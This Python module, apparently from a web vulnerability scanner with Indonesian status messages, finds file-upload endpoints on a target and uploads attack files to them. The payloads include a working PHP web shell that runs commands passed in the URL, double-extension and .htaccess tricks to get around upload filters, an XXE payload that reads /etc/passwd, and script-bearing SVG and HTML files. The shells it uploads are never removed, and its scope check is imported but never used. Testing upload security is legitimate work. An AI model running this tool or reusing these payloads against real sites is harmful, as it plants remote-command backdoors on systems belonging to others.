# checker/file_upload.py — FileUploadChecker v2
import re, uuid, json
import requests, urllib3
import threading
from typing import Dict, Any, Optional, List, Tuple
from urllib.parse import urljoin, urlparse

from helpers.http_client import HttpClient, HostDeadException
from helpers.waf_checker import WAFChecker
from helpers.scope import is_in_scope
from helpers.parsers import normalize_url

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Terminal output helpers ───────────────────────────────────────────────────

def _info(msg: str):  print(f"  [*] {msg}")
def _ok(msg: str):    print(f"  [+] {msg}")
def _warn(msg: str):  print(f"  [!] {msg}")
def _step(n: int, total: int, msg: str): print(f"\n  [{n}/{total}] {msg}")


# ── Headers ───────────────────────────────────────────────────────────────────

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/html, */*',
    'X-Requested-With': 'XMLHttpRequest',
}

PROBE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Accept': '*/*',
}


# ── Signatures ────────────────────────────────────────────────────────────────

CF_BLOCK_BODY = [
    'attention required', 'enable javascript and cookies',
    'checking your browser', 'sorry, you have been blocked',
    'ddos-guard', 'this page is protected by',
]

UPLOAD_SUCCESS_KEYWORDS = [
    'url', 'path', 'filename', 'file_url', 'file_path',
    'uploaded', 'success', 'location', 'src', 'link',
    'file uploaded', 'upload success', 'created',
]

UPLOAD_ENDPOINT_KEYWORDS = [
    'no file', 'file part', 'no file part', 'file selected',
    'no file selected', 'upload', 'multipart', 'file required',
    'missing file', 'no attachment', 'provide', 'required',
]

DIRECTORY_LISTING_KEYWORDS = [
    'index of', 'directory listing', 'parent directory',
    'last modified', '[dir]', 'index of /uploads', 'index of /files',
]

REJECTED_KEYWORDS = [
    'not allowed', 'invalid', 'unsupported', 'forbidden',
    'only', 'extension', 'type', 'mime', 'format', 'not permitted',
]


# ── Paths & Payloads ──────────────────────────────────────────────────────────

UPLOAD_PATHS = [
    '/upload', '/uploads', '/file/upload', '/files/upload',
    '/media/upload', '/image/upload', '/img/upload',
    '/asset/upload', '/assets/upload', '/attachment/upload',
    '/document/upload', '/static/upload',
    '/api/upload', '/api/file/upload', '/api/files',
    '/api/image/upload', '/api/images/upload',
    '/api/media/upload', '/api/media',
    '/api/attachment', '/api/attachments',
    '/api/document', '/api/documents',
    '/api/asset', '/api/assets',
    '/api/storage', '/api/storage/upload',
    '/api/posts/upload', '/api/post/upload',
    '/api/users/avatar', '/api/user/avatar',
    '/api/profile/photo', '/api/profile/avatar',
    '/api/products/image', '/api/product/image',
    '/api/v1/upload', '/api/v1/file/upload',
    '/api/v1/media/upload', '/api/v1/image/upload',
    '/api/files/single', '/api/files/multiple',
    '/upload.php', '/uploadfile.php', '/fileupload.php',
    '/api/v1/files', '/api/files/upload',
    '/fileUpload', '/api/fileUpload',
]

DANGEROUS_EXTENSIONS: List[Tuple[str, str, bytes]] = [
    ('php',      'application/x-php',        b'<?php echo shell_exec($_GET["cmd"]); ?>'),
    ('php5',     'application/x-php',        b'<?php phpinfo(); ?>'),
    ('php7',     'application/x-php',        b'<?php echo "pwned_php7"; ?>'),
    ('phtml',    'application/x-php',        b'<?php echo "pwned_phtml"; ?>'),
    ('phar',     'application/x-php',        b'<?php echo "pwned_phar"; ?>'),
    ('php.jpg',  'image/jpeg',               b'<?php echo "bypass_php_jpg"; ?>'),
    ('jpg.php',  'image/jpeg',               b'<?php echo shell_exec($_GET["cmd"]); ?>'),
    ('asp',      'application/octet-stream', b'<% Response.Write("pwned_asp") %>'),
    ('aspx',     'application/octet-stream', b'<%@ Page Language="C#"%><% Response.Write("pwned_aspx"); %>'),
    ('jsp',      'application/octet-stream', b'<% out.println("pwned_jsp"); %>'),
    ('py',       'text/plain',               b'import os\nprint(os.popen("id").read())'),
    ('sh',       'text/plain',               b'#!/bin/bash\necho pwned_sh'),
    ('rb',       'text/plain',               b'puts `id`'),
    ('pl',       'text/plain',               b'#!/usr/bin/perl\nprint `id`'),
    ('svg',      'image/svg+xml',
     b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'),
    ('html',     'text/html',                b'<script>alert("XSS_via_upload")</script>'),
    ('htm',      'text/html',                b'<script>alert("XSS_via_upload_htm")</script>'),
    ('htaccess', 'text/plain',               b'AddType application/x-httpd-php .jpg\nOptions +Indexes'),
    ('xml',      'application/xml',
     b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
]

CRITICAL_EXTENSIONS = {'php', 'php5', 'php7', 'phtml', 'phar', 'asp', 'aspx', 'jsp', 'htaccess'}

HIGH_EXTENSIONS = {'svg', 'html', 'htm', 'jpg.php', 'php.jpg'}

UPLOAD_FIELD_NAMES = [
    'file', 'image', 'photo', 'avatar', 'upload',
    'attachment', 'media', 'document', 'img',
    'picture', 'cover', 'thumbnail', 'icon',
]

PUBLIC_DIRS = [
    '/uploads/', '/upload/', '/files/', '/file/',
    '/media/', '/images/', '/img/', '/assets/',
    '/static/', '/static/uploads/', '/static/media/',
    '/storage/', '/public/', '/public/uploads/',
    '/assets/uploads/', '/api/uploads/',
    '/userfiles/', '/user/', '/data/',
]


# ── Severity ──────────────────────────────────────────────────────────────────

SEVERITY_VULN_KEY: dict[str, str] = {
    'CRITICAL': 'FILE_UPLOAD_CRITICAL',
    'HIGH':     'FILE_UPLOAD_HIGH',
    'MEDIUM':   'FILE_UPLOAD_MEDIUM',
    'LOW':      'FILE_UPLOAD_LOW',
}


def _classify_severity(ext: str, accessible: bool) -> str:
    if ext in CRITICAL_EXTENSIONS:
        return 'CRITICAL'
    if ext in HIGH_EXTENSIONS:
        return 'HIGH'
    if accessible:
        return 'MEDIUM'
    return 'LOW'


# ── Main class ────────────────────────────────────────────────────────────────

class FileUploadChecker:
    def __init__(self, url: str, timeout: float = 10.0,
                 cookies: Optional[Dict] = None,
                 scope_mode: str = 'wildcard',
                 discovered: Optional[Dict] = None):
        self.base_url        = url.rstrip('/')
        self.timeout         = int(timeout)
        self.cookies         = cookies or {}
        self.scope_mode      = scope_mode
        self.discovered      = discovered or {}
        
        self._uid            = uuid.uuid4().hex[:8]
        self._is_spa         = self.discovered.get('is_spa', False)
        self._pw_used        = self.discovered.get('playwright_used', False)
        self._waf_detected   = self.discovered.get('waf_detected', False)
        self._waf_info       = self.discovered.get('waf_info', {})
        self._vuln_found     = threading.Event()
        
        self._api_bases: List[str]   = [self.base_url]
        for base in self.discovered.get('api_bases', []):
            if base not in self._api_bases:
                self._api_bases.append(base)
                
        self._extra_paths: List[str] = []
        for ep in self.discovered.get('endpoints', []):
            p = urlparse(ep).path
            if p and ('upload' in p.lower() or 'file' in p.lower()):
                self._extra_paths.append(p)

        self._client = HttpClient(
            timeout=self.timeout, headers=HEADERS,
            cookies=self.cookies, verify=False, retries=0,
        )

    # ── Utils ─────────────────────────────────────────────────────────────────

    def _get(self, url: str, **kwargs):
        try:
            return self._client.get(url, **kwargs)
        except Exception:
            return None

    def _post_raw(self, url: str, use_probe_headers: bool = False, **kwargs):
        try:
            s = requests.Session()
            s.headers.update(PROBE_HEADERS if use_probe_headers else HEADERS)
            s.cookies.update(self.cookies)
            s.verify = False
            return s.post(url, timeout=self.timeout, **kwargs)
        except Exception:
            return None

    def _is_cf_block(self, r) -> bool:
        if r is None:
            return False
        if r.headers.get('cf-mitigated', '').lower() == 'challenge':
            return True
        if r.status_code == 403:
            return any(k in r.text.lower() for k in CF_BLOCK_BODY)
        return WAFChecker.is_waf_block(r)


    # ── Step 2: Probe upload endpoints ────────────────────────────────────────

    def _probe_endpoint(self, url: str) -> Optional[requests.Response]:
        strategies = [
            lambda: self._post_raw(url, use_probe_headers=True, data={}),
            lambda: self._post_raw(url, use_probe_headers=True,
                                   files={'file': ('', b'', 'application/octet-stream')}),
            lambda: self._post_raw(url, use_probe_headers=True, data={'_probe': '1'}),
        ]
        for fn in strategies:
            try:
                r = fn()
                if r is not None and r.status_code not in (404, 410):
                    return r
            except Exception:
                continue
        return None

    def _is_upload_endpoint(self, url: str) -> bool:
        r = self._probe_endpoint(url)
        if r is None or self._is_cf_block(r):
            return False

        status = r.status_code
        body   = r.text.lower()

        if status in (404, 410):    return False
        if status == 405:           return 'POST' in r.headers.get('Allow', '')
        if status == 403:           return not self._is_cf_block(r)
        if status == 401:           return True
        if status == 400:
            return any(k in body for k in UPLOAD_ENDPOINT_KEYWORDS) or 'file' in body
        if status == 422:
            return 'file' in body or 'upload' in body or 'required' in body
        if status == 500:
            return 'file' in body or 'upload' in body or 'werkzeug' in body
        if status in (200, 201):    return True
        return False

    def _discover_upload_endpoints(self) -> List[str]:
        api_first = [b for b in self._api_bases if b != self.base_url]
        ordered   = api_first + [self.base_url]

        candidates = []
        for base in ordered:
            for path in UPLOAD_PATHS:
                candidates.append(f"{base.rstrip('/')}{path}")
            for path in self._extra_paths:
                candidates.append(normalize_url(path, base))
                
        # Include any discovered forms with file upload inputs
        for form in self.discovered.get('forms', []):
            if form.get('action') and any(inp.get('type') == 'file' for inp in form.get('inputs', [])):
                candidates.append(form['action'])
                
        candidates = list(dict.fromkeys(candidates))

        _info(f"Probing {len(candidates)} kandidat endpoint ...")
        found = []
        for url in candidates:
            if self._is_upload_endpoint(url):
                found.append(url)
                _ok(f"Upload endpoint: {url}")

        if not found:
            _info("Fallback ke API subdomain ...")
            fallback_paths = [
                '/api/upload', '/upload',
                '/api/file/upload', '/api/media/upload',
                '/api/image/upload',
            ]
            for base in (api_first or self._api_bases):
                for path in fallback_paths:
                    url = f"{base.rstrip('/')}{path}"
                    r   = self._get(url)
                    if r is not None and r.status_code not in (404, 410) \
                            and not self._is_cf_block(r):
                        found.append(url)
                        _ok(f"Fallback endpoint: {url}")

        return list(dict.fromkeys(found))

    # ── Step 3: Test dangerous uploads ────────────────────────────────────────

    def _is_upload_success(self, r) -> bool:
        if r is None or r.status_code not in (200, 201):
            return False
        return any(k in r.text.lower() for k in UPLOAD_SUCCESS_KEYWORDS)

    def _extract_file_path(self, response_text: str) -> Optional[str]:
        try:
            data = json.loads(response_text)
            for key in ['url', 'file_url', 'path', 'file_path',
                        'src', 'location', 'link', 'filename']:
                val = data.get(key)
                if isinstance(val, str) and ('/' in val or '.' in val):
                    return val
            for key in ['data', 'file', 'result', 'response']:
                nested = data.get(key)
                if isinstance(nested, dict):
                    for subkey in ['url', 'path', 'src', 'file_url']:
                        val = nested.get(subkey)
                        if isinstance(val, str) and '/' in val:
                            return val
        except Exception:
            pass

        m = re.search(
            r'["\']([/\w.+-]+\.(?:php\d?|phtml|phar|asp[x]?|jsp|'
            r'py|sh|rb|pl|svg|html?|htaccess|xml))["\']',
            response_text, re.I
        )
        return m.group(1) if m else None

    def _verify_accessible(self, file_path: str, ext: str,
                            upload_base: str) -> Tuple[bool, str]:
        if file_path.startswith('http'):
            candidates = [file_path]
        else:
            candidates = [
                f"{base.rstrip('/')}/{file_path.lstrip('/')}"
                for base in self._api_bases
            ]
            candidates.append(f"{upload_base.rstrip('/')}/{file_path.lstrip('/')}")

        for url in list(dict.fromkeys(candidates)):
            r = self._get(url)
            if r is None or r.status_code == 404:
                continue
            if r.status_code == 200:
                if ext in ('php', 'php5', 'php7', 'phtml', 'phar'):
                    return ('<?php' not in r.text), url
                return True, url
        return False, ''

    def _test_upload_endpoint(self, upload_url: str, results: Dict):
        sorted_exts = sorted(
            DANGEROUS_EXTENSIONS,
            key=lambda x: (0 if x[0] in CRITICAL_EXTENSIONS else 1)
        )

        for ext, mime, content in sorted_exts:
            if self._vuln_found.is_set():
                break

            filename = f"scan_{self._uid}.{ext}"

            for field in UPLOAD_FIELD_NAMES:
                if self._vuln_found.is_set():
                    break

                r = self._post_raw(
                    upload_url,
                    files={field: (filename, content, mime)},
                )
                if r is None or self._is_cf_block(r):
                    continue

                if r.status_code in (400, 415, 422, 403):
                    if any(k in r.text.lower() for k in REJECTED_KEYWORDS):
                        break

                if self._is_upload_success(r):
                    file_path            = self._extract_file_path(r.text)
                    accessible, resolved = False, ''

                    if file_path:
                        accessible, resolved = self._verify_accessible(
                            file_path, ext, upload_url
                        )

                    severity = _classify_severity(ext, accessible)
                    parsed   = urlparse(upload_url)

                    _warn(f"[{severity}] Upload berhasil -> "
                          f"field={field} | ext=.{ext} | {upload_url}")
                    if resolved:
                        _ok(f"File accessible: {resolved} (exec={accessible})")

                    results['vulnerable_paths'].append({
                        'url':           upload_url,
                        'path':          parsed.path,
                        'base':          f"{parsed.scheme}://{parsed.netloc}",
                        'field':         field,
                        'filename':      filename,
                        'extension':     ext,
                        'mime':          mime,
                        'file_path':     file_path,
                        'file_url':      resolved or file_path,
                        'accessible':    accessible,
                        'status_code':   r.status_code,
                        'severity':      severity,
                        'vuln_key':      SEVERITY_VULN_KEY.get(severity),
                        'file_count':    0,
                        'dir_count':     0,
                        'notable_files': [resolved] if resolved else [],
                        'is_nested':     False,
                        'response':      r.text[:300],
                    })
                    results['findings'].append(
                        f"[{severity}] Upload file berbahaya diterima: "
                        f"{upload_url} (field={field}, ext=.{ext})"
                        + (f" -> {resolved}" if resolved else "")
                    )
                    self._vuln_found.set()
                    break

    # ── Step 4: Directory listing ─────────────────────────────────────────────

    def _check_directory_listing(self, results: Dict):
        for base in self._api_bases:
            for path in PUBLIC_DIRS:
                url = f"{base.rstrip('/')}{path}"
                r   = self._get(url)
                if r is None or r.status_code != 200 or self._is_cf_block(r):
                    continue
                if any(kw in r.text.lower() for kw in DIRECTORY_LISTING_KEYWORDS):
                    if url not in results['directory_listing']:
                        _warn(f"Directory listing aktif: {url}")
                        results['directory_listing'].append(url)
                        results['findings'].append(f"Directory listing aktif: {url}")

    # ── Main run ──────────────────────────────────────────────────────────────

    def run(self) -> Dict[str, Any]:
        results = {
            'vulnerable':        False,
            'vulnerable_paths':  [],
            'directory_listing': [],
            'findings':          [],
            'error':             None,
            'summary':           {},
            'spa_detected':      self._is_spa,
            'playwright_used':   self._pw_used,
            'waf_detected':      self._waf_detected,
            'waf_info':          self._waf_info,
        }

        try:
            waf_name   = self._waf_info.get('waf_name', '?')
            waf_status = f"terdeteksi ({waf_name})" if self._waf_detected else "tidak terdeteksi"
            _info(f"WAF: {waf_status}")

            _step(1, 3, "Menggunakan API base & endpoint (dari CrawlerHelper) ...")
            if len(self._api_bases) > 1:
                _info(f"API base ditemukan: {', '.join(self._api_bases[1:])}")

            _step(2, 3, "Mencari endpoint upload ...")
            endpoints = list(dict.fromkeys(self._discover_upload_endpoints()))
            _info(f"Total {len(endpoints)} endpoint upload aktif")

            if endpoints:
                _step(3, 3, "Testing dangerous file upload ...")
                for url in endpoints:
                    if self._vuln_found.is_set():
                        break
                    _info(f"Testing: {url}")
                    self._test_upload_endpoint(url, results)
            else:
                _step(3, 3, "Tidak ada endpoint upload ditemukan")
                results['findings'].append("Tidak ditemukan endpoint upload aktif.")

            _info("Checking directory listing ...")
            self._check_directory_listing(results)

            # ── Finalize + summary ────────────────────────────────────────────
            if results['vulnerable_paths'] or results['directory_listing']:
                results['vulnerable'] = True
                count = len(results['vulnerable_paths'])

                sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
                for vp in results['vulnerable_paths']:
                    sev = vp.get('severity', 'LOW')
                    sev_count[sev] = sev_count.get(sev, 0) + 1

                results['summary'] = {
                    'total_vulnerable_paths':  count,
                    'total_directory_listing': len(results['directory_listing']),
                    'severity_breakdown':      {k: v for k, v in sev_count.items() if v > 0},
                }

                results['findings'].insert(0,
                    f"File Upload Misconfiguration: "
                    f"{count} upload vuln, "
                    f"{len(results['directory_listing'])} directory listing."
                )
                _ok(
                    f"Total: {count} upload vuln | "
                    f"CRITICAL={sev_count.get('CRITICAL', 0)} "
                    f"HIGH={sev_count.get('HIGH', 0)} "
                    f"MEDIUM={sev_count.get('MEDIUM', 0)}"
                )
            else:
                results['findings'].append(
                    "Tidak ditemukan File Upload Misconfiguration."
                )

        except Exception as e:
            results['error'] = str(e)
        finally:
            try:
                self._client.close()
            except Exception:
                pass

        return results